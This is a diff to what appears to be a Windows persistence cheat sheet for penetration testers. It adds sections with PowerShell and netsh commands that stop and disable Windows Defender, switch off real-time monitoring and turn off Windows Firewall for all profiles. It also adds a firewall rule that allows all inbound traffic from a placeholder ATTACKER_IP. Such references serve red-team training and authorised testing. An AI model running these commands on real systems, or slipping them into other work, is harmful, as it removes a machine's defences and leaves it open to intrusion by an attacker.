@@ -3,6 +3,8 @@
 ## Summary
 
 * [Tools](#tools)
+* [Disable Windows Defender](#disable-windows-defender)
+* [Disable Windows Firewall](#disable-windows-firewall)
 * [Userland](#userland)
     * [Registry](#registry)
     * [Startup](#startup)
@@ -18,6 +20,24 @@
 ## Tools
 
 - [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
+
+## Disable Windows Defender
+
+```powershell
+sc config WinDefend start= disabled
+sc stop WinDefend
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+## Disable Windows Firewall
+
+```powershell
+Netsh Advfirewall show allprofiles
+NetSh Advfirewall set allprofiles state off
+
+# ip whitelisting
+New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+```
 
 ## Userland
 
